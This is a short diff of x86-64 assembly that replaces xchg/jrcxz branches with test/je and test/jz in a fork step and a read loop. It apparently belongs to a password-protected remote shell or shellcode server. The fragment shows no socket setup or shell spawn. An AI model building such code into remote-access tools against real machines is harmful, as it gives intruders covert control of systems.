@@ -197,8 +197,8 @@ password_check:
 %endif
         mov al, SYS_FORK
         syscall
-        xchg eax, ecx
-        jrcxz childcase                     ; if we are the child then continue execution
+        test eax, eax
+        je childcase                        ; if we are the child then continue execution               
         push SYS_CLOSE
         pop rax
         syscall
@@ -287,8 +287,8 @@ readloop:
         mov edx, ebp
         xor eax, eax
         syscall                             ; read data to buffer
-        xchg eax, ecx
-        jrcxz exitserver                    ; if we read zero bytes then stop                       
+        test eax, eax
+        jz exitserver                       ; if we read zero bytes then stop                                   
         push rax
         pop rdx
         mov rdi, r15
